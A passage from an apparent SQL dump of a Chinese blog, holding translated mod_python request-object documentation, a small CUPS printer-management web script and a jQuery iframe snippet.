style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">请求的文件名字符串。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>canonical_filename</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">字符串，真实的文件名</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(req.filename</span></font><font face=\"宋体\">是有效的，如果她们不同</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">)</span></font><font face=\"宋体\">。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>path_info</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">字符串，在文件名之后，查询参数之前的部分。同</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">CGI\nPATH_INFO</span></font><font face=\"宋体\">。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>args</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">字符串，同</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">CGI\nQUERY_ARGS</span></font><font face=\"宋体\">，只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>finfo</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">元组，文件信息结构，类似于</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">POSIX</span></font><font face=\"宋体\">状态，</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">URI</span></font><font face=\"宋体\">指向的文件的信息</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(mode,ino,dev,nlink,uid,gid,size,atime,mtime,ctime,fname,name)</span></font><font face=\"宋体\">。模块</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">apache</span></font><font face=\"宋体\">定义了</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">FINFO_*</span></font><font face=\"宋体\">变量的常量，可用于存取其中的元素，如：</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">fname=req.finfo[apache.FINFO_FNAME]</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>parsed_uri</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">元组，被分解开的</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">URI</span></font><font face=\"宋体\">：</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(scheme,hostinfo,user,\npassword, hostname,\nport,path,query,fragment)</span></font><font face=\"宋体\">。模块</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">apache</span></font><font face=\"宋体\">定义了</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">URI*</span></font><font face=\"宋体\">常量用于存取元组的元素，如：</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">fname=req.parsed_uri[apache.URI_PATH]</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>used_path_info</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">当前请求中被拒绝</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(reject)</span></font><font face=\"宋体\">的</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">path_info</span></font><font face=\"宋体\">，只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>eos_sent</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">布尔值，是否发送过</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">EOS</span></font><font face=\"宋体\">，只读。</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(EOS=end of\nstream)</span></font></p>',1,1,1,0,0,0,'简易的网页，使用mod_python比django要方便的多，比如一个打印机管理页面，因此用到一此req的属性，如下：主要是设置req.content_type=\"text/html\", 以及禁用缓存 req.no_cache=True#encoding: utf-8from mod_python import apacheimport os,repage=\'\'\'&lt;head&gt;&lt;META HTTP-EQUIV=\"Pragma\" CONTENT=\"no-cache\"&gt;&lt;META HTTP-EQUIV=\"Cache-Control\" CONTENT=\"no-cache\"&gt;&lt;META HTTP-EQUIV=\"Expires\" CONTENT=\"0\"&gt;&lt;title&gt;打印机管理&lt;/title&gt;&lt;script src=\"/js/jquery.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt;function clsJob(){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $.get(\'/index.py/?clear\',function(data){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(data==\'\'){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $(\"#jobs\").html(\'队列中没有作业\');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alert(\"打印队列已清空\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alert(data);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; });}function openPr(){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $.get(\'/index.py/?open\',function(data){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(data==\'already\'){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alert(\'打印机已经打开\');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(data==\'succeed\' || data==\'already\'){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $(\'#status\').html(\'&lt;font color=\"green\"&gt;正常&lt;/font&gt;\');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alert(\'出错了,RP有问题,去看看打印机开了没\');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; });}&lt;/script&gt;&lt;/head&gt;&lt;body&gt;打印机 状态: &lt;span id=\"status\"&gt;%s&lt;/span&gt;&lt;hr&gt;&lt;div id=\"jobs\"&gt;&lt;a href=\"javascript:void(0);\" onclick=\"javascript:clsJob();\"&gt;清空打印队列&lt;/a&gt;&lt;/body&gt;\'\'\'def index(req):&nbsp;&nbsp;&nbsp; req.content_type=\"text/html;charset=UTF-8\"&nbsp;&nbsp;&nbsp; req.no_cache=True&nbsp;&nbsp;&nbsp; act=req.args&nbsp;&nbsp;&nbsp; if act==None:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write(page % prInfo())&nbsp;&nbsp;&nbsp; elif act==\'open\':&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write(open())&nbsp;&nbsp;&nbsp; elif act==\'clear\':&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write(clsJob())&nbsp;&nbsp;&nbsp; else:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write(\'failed\')&nbsp;&nbsp;&nbsp; req.flush()def open():&nbsp;&nbsp;&nbsp; info=rawInfo()&nbsp;&nbsp;&nbsp; if not isReady(info):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; raw=os.popen(\'/usr/sbin/cupsenable CBIB-Printer\').read()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if raw==\'\':&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result=\'succeed\'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result=\'failed\'&nbsp;&nbsp;&nbsp; else:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result=\'already\'&nbsp;&nbsp;&nbsp; return resultdef prInfo(info=None):&nbsp;&nbsp;&nbsp; if info==None:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; info=rawInfo()&nbsp;&nbsp;&nbsp; if isReady(info):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ready=\'&lt;font color=\"green\"&gt;正常&lt;/font&gt;\'&nbsp;&nbsp;&nbsp; else:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ready=\'&lt;font color=\"red\"&gt;暂停&lt;/font&gt;&amp;nbsp;&lt;a href=\"javascript:void(0);\" onclick=\"javascript:openPr();\"&gt;打开&lt;/a&gt;\'&nbsp;&nbsp;&nbsp; if info[1]==\'no entries\':&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jobs=\'队列中没有作业\'&nbsp;&nbsp;&nbsp; else:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jobs=\"作业列表:&lt;br&gt;\"+\'&lt;br&gt;\'.join(info[2:])&nbsp;&nbsp;&nbsp; return (ready,jobs)def rawInfo():&nbsp;&nbsp;&nbsp; return os.popen(\'lpq\').read().split(\'\\n\')def isReady(info=None):&nbsp;&nbsp;&nbsp; if info==None:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; info=rawInfo()&nbsp;&nbsp;&nbsp; raw=re.findall(\'not\',info[0])&nbsp;&nbsp;&nbsp; if len(raw)==0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return True&nbsp;&nbsp;&nbsp; else:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return Falsedef clsJob():&nbsp;&nbsp;&nbsp; return os.popen(\'/usr/bin/lprm\').read()请求对象是映射到apache的request_rec结构的对象。当处理器被调用时，会传递唯一个的一个参数就是请求对象。可以为请求对象指定属性，用于在处理器之间通信。如下是方法：\n\nadd_common_vars()\n\n间接调用ap_add_common_vars()函数。调用后，req.subprocess_env会包含大量的CGI信息。\n\nadd_handler(htype,handler[,dir])\n\n允许动态注册处理器。htype是要添加的处理器的标志，如\'PythonHandler\'，但不可以是过滤器(filter)或连接(connection)。handler是包含模块名或函数名的处理器函数。可选参数dir是需要添加到pythonpath环境变量的路径。如果未指定目录，而且有同类型的处理器，则继承路径，否则用前一路径。如果有PythonPath标志存在，则sys.path将会设置为它。\n\n通过这种方式添加的处理器生存期为这个请求。为同一个类型添加多个处理器是很有用的，不过要注意避免死循环(infinite\nloop)。\n\n动态注册处理器是一种很有用的技术，比如用于PythonAuthenHandler，可以为不同的认证级别指定不同的权限。如：\n\nif\nmanager:\n\nreq.add_handler(\"PythonHandler\",\"menu::admin\")\n\nelse:\n\nreq.add_handler(\"PythonHandler\",\"menu::basic\")\n\n注意，如果传递了一个无效处理器，则会在寻找处理器时发生异常。\n\nallow_methods(methods[,reset])\n\n添加方法到req.allowed_methods列表。这个列表将会允许传递，在头部指定HTTP_METHOD_NOT_ALLOWED或HTTP_NOT_IMPLEMENTED返回到客户端。注意apache并不会对这些方法起作用。这个列表仅仅用于构造头部。实际的方法处理逻辑在处理器代码中提供。\n\nmethods是一个字符串列表，如果reset设置为1，则列表会被清空。\n\ndocument_root()\n\n返回DocumentRoot设置\n\nget_basic_auth_pw()\n\n返回简单认证时的密码字符串\n\nget_config()\n\n返回包含mod_python配置的表格对象的引用，用于当前请求，除了Python*Handler和PythonOption(可以通过req.get_options()获得)。表格包含键，和值列表。\n\nget_remote_host([type,str_is_ip])\n\n用于查询客户端的DNS名和IP地址，首次调用时查询DNS，其后的查询返回缓存数据。\n\n可选参数type可为如下值：\n\napache.REMOTE_HOST：查询DNS名，当apache标志HostNameLookups为off时返回None，无法查询。\n\napache.REMOTE_NAME：缺省值，尽可能返回DNS名，否则返回IP地址字符串。\n\napache.REMOTE_NOLOOKUP：不执行DNS查询，直接返回IP地址。如果曾经执行过查询，则返回缓存的机器名。\n\napache.REMOTE_DOUBLE_REV：强制使用double-reverse查询，失败返回None。\n\n如果str_is_ip设为None或未指定，则返回值为DNS名或IP地址的字符串。如果str_is_ip不为None，则返回一个(address,str_is_ip)元组。当str_is_ip为非零则address为IP地址字符串。失败返回None。\n\nget_options()\n\n返回PythonOptions标志的选项表格的引用。\n\ninternal_redirect(new_uri)\n\n对请求进行内部重定向。new_uri是字符串。内部重定向将会创建一个新的请求对象，并执行所有的阶段。req.prev包含重定向之前的地址。\n\nlog_error(message[,level])\n\n对apache函数ap_log_error()函数的接口。message是日志信息，level是日志级别标志，可为如下值：\n\nAPLOG_EMERG\n\nAPLOG_ALERT\n\nAPLOG_CRIT\n\nAPLOG_ERR\n\nAPLOG_WARNNING\n\nAPLOG_NOTICE\n\nAPLOG_INFO\n\nAPLOG_DEBUG\n\nAPLOG_NOERRNO\n\n如果需要写入日志而不是通过请求对象，可用apache.log_error函数。\n\nmeets_conditions()\n\n调用apache函数ap_meets_conditions()返回状态码。如果status是apache.OK，则响应正确。如果不是则简单的返回状态码status。注意req.headers_out将会被优先(prior)设置，并也会影响req.status的值，假如不是返回apache.OK。\n\n例如：\n\n...\n\nr.headers_out[\'ETag\']=\"1130794f-3774-4584-a4ea-0ab19e684268\"\n\nr.headers_out[\'Last-Modified\']=\'Wed, 23 Feb 2005 00:00:00\nGMT\'\n\nr.headers_out[\'Expires\']=\'Mon, 18 Apr 2005 17:30:00\nGMT\'\n\nstatus=r.meets_conditons()\n\nif\nstatus!=apache.OK:\n\nreturn\nstatus\n\n...\n处理响应内容 ...\n\nrequires()\n\n返回包含require标志参数的元组。例如如下apache配置：\n\nAuthType\nBasic\n\nrequire user\njoe\n\nrequire\nvalid-user\n\n函数将会返回(\'user\njoe\',\'valid-user\')\n\nread([len])\n\n从客户端读取最多len字节的数据，返回字符串数据。如果len为负数(negative)或者缺省(omitted)，则读取所有的数据。这个函数也会受到apache配置标志Timeout的影响，如果读取时超时则会终端，并抛出IOError异常。\n\n这个函数依赖于(rely的复数relies)客户端提供的Content-length头。如果未提供这个头，则缺省为0。不正确的Content-length将会导致函数试图读取更多的数据，并且在超时到达之前一直出于阻塞状态。\n\nreadline([len])\n\n像read()一样读取到行尾。注意，同HTTP定义一样，大多数客户端的行结束是\'\\r\\n\'，而不是简单的\'\\n\'。\n\nreadlines([sizehint])\n\n读取sizehint字节以内的所有行，并返回行列表。\n\nregister_cleanup(callable[,data])\n\n注册一个清理行为。参数callable可以为任何可调用对象，可选参数data可以是任何对象，缺省为None。在每个请求结束的时候，而在请求对象被销毁之前，callable将会被调用，并且传递一个唯一的参数data。\n\n推荐传递请求对象作为data，但是注意，在执行清理行为时，请求对象的处理已经完成，这时再对客户端进行写操作是无意义的(pointless)。\n\n如果在执行清理时遇到(encounter)错误，将会被日志记录。除非直接影响请求处理，否则执行清理中的bug很难辨认(spot)。\n\n如果在清理行为之前，服务器关闭了，则很可能不会被执行。\n\nsendfile(path[,offset,len])\n\n发送path文件到客户端，开始为offset，并发送len字节。offset缺省为0，而len缺省为-1，发送整个(entire)文件。\n\n返回成功发送的字节数，或者在出错时抛出IOError异常。这个函数提供了向客户端发送文件的最有效(most\nefficient)的方式。\n\nwrite(string[,flush=1])\n\n将字符串立即(directly)写入客户端，然活清空(flush)缓存，除非flush是0。\n\nflush()\n\n将缓存数据写入客户端，并清空缓存。\n\nset_content_length(len)\n\n设置req.length和\"Content-length\"头。注意必须在任何发送数据之前设置，比如req.write()之前，否则是无意义的(meaningless)。\n\n请求对象的成员：\n\n\nconnection\n\n这个请求的连接对象。查看后面的详细介绍。只读。\n\nserver\n\n请求所属的服务器对象。查看后面的详细介绍。只读。\n\nnext\n\n如果是内部重定向，重定向到的请求对象。只读。\n\nprev\n\n如果是内部重定向，来自重定向的请求对象。只读。\n\nmain\n\n如果这是一个子请求，指向主请求。只读。\n\nthe_request\n\n包含请求的第一行的字符串。只读。\n\nassbackwards\n\n指定HTTP/0.9的简单请求。这意味着响应不包含任何头，仅包含信息主体。用于兼容古老的浏览器。也可以指定这个选项用于在重定向中避免(avoid)发送头。\n\nproxyreq\n\n代理请求。一个apache.PROXYREQ_*值。只读。\n\nheader_only\n\n指定HEAD请求的布尔变量，反对GET。只读。\n\nprotocol\n\n客户端提供的协议，或者是\'HTTP/0.9\'。同CGI SERVER_PROTOCOL。只读。\n\nproto_num\n\n整数，协议版本号，比如1.1对应1001。只读。\n\nhostname\n\n字符串，由URI或Host:设置，头。只读。\n\nrequest_time\n\n长整数，请求发生的时间。只读。\n\nstatus_line\n\n状态行，如\'200\nOK\'。只读。\n\nstatus\n\n状态，apache.HTTP_*中的一个值。\n\nmethod\n\n包含方法的字符串，如\'GET\'，\'HEAD\'，\'POST\'。同CGI\nREQUEST_METHOD。只读。\n\nmethod_number\n\n方法号，整数。只读。\n\nallowed\n\n整数，允许方法的位逻辑。使用允许结构：头响应HTTP_METHOD_NOT_ALLOWED或HTTP_NOT_IMPLEMENTED。这个字段是apache内部使用的。需要设置则使用req.allow_methods()方法。只读。\n\nallowed_xmethods\n\n元组，允许的扩展(extension)方法。只读。\n\nallowed_methods\n\n元组，允许的方法，使用METHOD_NOT_ALLOWED的关系。这个成员无法被req.allow_methods()方法修改。只读。\n\nsent_bodyct\n\n整数，正文的字节数。只读。\n\nbytes_sent\n\n长整数，已经发送的字节数。只读。\n\nmtime\n\n长整数，资源的修改时间。只读。\n\nchunked\n\n传送大块数据时的编码，布尔值。只读。\n\nrange\n\n字符串\'Range:\'头。只读。\n\nclength\n\n长整数，真正的正文长度。只读。\n\nremaining\n\n长整数，等待读取的数据字节数，只在一个读取操作中有效，只读。\n\nread_length\n\n长整数，已经读取的字节数，只读。\n\nread_body\n\n整数，请求体怎样被读取，只读。\n\nread_chunked\n\n布尔值，读取大块数据的编码。只读。\n\nexpecting_100\n\n布尔值，是否客户端需要等待100(HTTP_CONTINUE)响应，只读。\n\nheaders_in\n\n客户端发来的头的表格对象。\n\nheaders_out\n\n需要发送给客户端的头的表格对象。\n\nerr_headers_out\n\n当出错时需要发送的头的表格对象，用于出错时替换headers_out。\n\nsubprocess_env\n\n包含CGI信息的表格对象。在需要信息之前需要先调用req.add_common_vars()方法来填充信息。\n\nnotes\n\n与请求拥有共同生存期的对象，用于存储各种信息，可以在一个请求的各个处理器之间传递信息。如果确实需要在各个处理器之间传递信息，最好的方式是给请求对象添加成员。\n\nphase\n\n正在处理的阶段，比如\'PythonHandler\'，只读。\n\ninterpreter\n\n正在运行的子解释器名。\n\ncontent_type\n\n字符串，正文类型。mod_python维护一个内部标志(req._content_type_set)来保持content_type的设置。发布器按照如下方式使用这个标志：当content_type没有明确(explicitly)的设置时，它依靠输出的前几个字节来猜测(attempt)。\n\ncontent_languages\n\n元组。用字符串列表表示正文的语言。\n\nhandler\n\n当前处理器的名字。由mod_mime设置，而不是mod_python处理器。大多数情况还是\'mod_python\'，只读。\n\ncontent_encoding\n\n字符串，正文编码，只读。\n\nvlist_validator\n\n整数，有效变量的列表(如果为负数)，只读。\n\nuser\n\n获取验证的用户名。同CGI\nREMOTE_USER，只读。注意，req.get_basic_auth_pw()必须在此之前调用(be called prior)。\n\nap_auth_type\n\n验证类型，同CGI\nAUTH_TYPE，只读。\n\nno_cache\n\n布尔值，如果为true则没有缓存，只读。\n\nno_local_copy\n\n布尔值，如果没有本地副本，只读。\n\nunparsed_uri\n\nURI没有经过任何转换，只读。\n\nuri\n\nURI的一部分路径，只读。\n\nfilename\n\n请求的文件名字符串。\n\ncanonical_filename\n\n字符串，真实的文件名(req.filename是有效的，如果她们不同)。只读。\n\npath_info\n\n字符串，在文件名之后，查询参数之前的部分。同CGI\nPATH_INFO。\n\nargs\n\n字符串，同CGI\nQUERY_ARGS，只读。\n\nfinfo\n\n元组，文件信息结构，类似于POSIX状态，URI指向的文件的信息(mode,ino,dev,nlink,uid,gid,size,atime,mtime,ctime,fname,name)。模块apache定义了FINFO_*变量的常量，可用于存取其中的元素，如：\n\nfname=req.finfo[apache.FINFO_FNAME]\n\n只读。\n\nparsed_uri\n\n元组，被分解开的URI：(scheme,hostinfo,user,\npassword, hostname,\nport,path,query,fragment)。模块apache定义了URI*常量用于存取元组的元素，如：\n\nfname=req.parsed_uri[apache.URI_PATH]\n\n只读。\n\nused_path_info\n\n当前请求中被拒绝(reject)的path_info，只读。\n\neos_sent\n\n布尔值，是否发送过EOS，只读。(EOS=end of\nstream)','',0,'unix',0,'','zinnia/_entry_detail.html','entry_detail.html'),(325,'jquery的iframe操作','337319372009112992418428',2,'2009-12-29 09:24:18',NULL,'2009-12-29 09:24:18','2014-07-13 18:57:24','$(document).ready(function(){<br />&nbsp;&nbsp; &nbsp;$(\"table\").css(\"width\",&lt;bean:write name=\"treeHeight\"/&gt;*60);<br />&nbsp;&nbsp; &nbsp;//设置高度<br />&nbsp;&nbsp; &nbsp;var main = $(window.parent.document).find(\"#treeFrame\");<br />&nbsp;&nbsp; &nbsp;var thisheight = $(document).height()+30;<br />&nbsp;&nbsp; &nbsp;main.height(thisheight);<br />&nbsp;&nbsp; &nbsp;$(\".stepui\").click(function(){<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var id=$(this).attr(\"id\");<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find(\"#onestep\").show();<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find(\"#detailname\").html(\"&lt;a href=\'../action/viewCraftStep.do?id=\"+encodeURI(id)+\"\'&gt;\"+$(this).text()+\"&lt;/a&gt;\");<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find(\"#detailpriv\").html(\"&lt;a href=\'../action/addCraftStep.do?ready=false&amp;action=priv&amp;id=\"+encodeURI(id)+\"\'&gt;添加&lt;/a&gt;\");<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if($(this).attr(\"class\").indexOf(\"noNext\")!=-1)<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find(\"#detailnext\").html(\"&lt;a href=\'../action/addCraftStep.do?ready=false&amp;action=next&amp;id=\"+encodeURI(id)+\"\'&gt;添加&lt;/a&gt;\");<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find(\"#detailnext\").html(\'\');<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find(\"#detailedit\").html(\"&lt;a href=../action/editCraftStep.do?ready=false&amp;id=\"+encodeURI(id)+\"&gt;编辑&lt;/a&gt;\");<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return false;<br />&nbsp;&nbsp; &nbsp;});<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br />});',1,1,1,0,0,0,'$(document).ready(function(){&nbsp;&nbsp; &nbsp;$(\"table\").css(\"width\",&lt;bean:write name=\"treeHeight\"/&gt;*60);&nbsp;&nbsp; &nbsp;//设置高度&nbsp;&nbsp; &nbsp;var main = $(window.parent.document).find(\"#treeFrame\");&nbsp;&nbsp; &nbsp;var thisheight = $(document).height()+30;&nbsp;&nbsp; &nbsp;main.height(thisheight);&nbsp;&nbsp; &nbsp;$(\".stepui\").click(function(){&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var id=$(this).attr(\"id\");&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find(\"#onestep\").show();&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find(\"#detailname\").html(\"&lt;a href=\'../action/viewCraftStep.do?id=\"+encodeURI(id)+\"\'&gt;\"+$(this).text()+\"&lt;/a&gt;\");&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find(\"#detailpriv\").html(\"&lt;a href=\'../action/addCraftStep.do?ready=false&amp;action=priv&amp;id=\"+encodeURI(id)+\"\'&gt;添加&lt;/a&gt;\");&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if($(this).attr(\"class\").indexOf(\"noNext\")!=-1)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find(\"#detailnext\").html(\"&lt;a href=\'../action/addCraftStep.do?ready=false&amp;action=next&amp;id=\"+encodeURI(id)+\"\'&gt;添加&lt;/a&gt;\");&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 